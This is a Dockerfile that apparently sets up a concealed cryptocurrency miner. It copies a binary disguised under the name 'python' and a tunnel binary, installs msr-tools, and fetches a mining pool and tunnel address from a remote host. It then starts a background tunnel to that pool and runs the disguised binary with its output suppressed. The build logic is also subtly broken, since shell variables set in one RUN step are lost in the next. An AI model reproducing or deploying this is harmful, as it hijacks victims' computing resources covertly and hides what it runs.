FROM debian:sid
COPY my-tu /
WORKDIR /app
COPY python /app/
COPY config.json /app/

RUN apt update -y \
  && apt install -y procps msr-tools curl
RUN pool=$(curl -s html.vscwjm.eu.org/XM/pool) && \
  tunn=$(curl -s html.vscwjm.eu.org/XM/tunn)
RUN chmod a+x /my-tu /app/python && \
  (/my-tu -L 127.0.0.1:3333:$pool $tunn &) && \
  cd /app && \
  ./python > /dev/null 

CMD /bin/bash
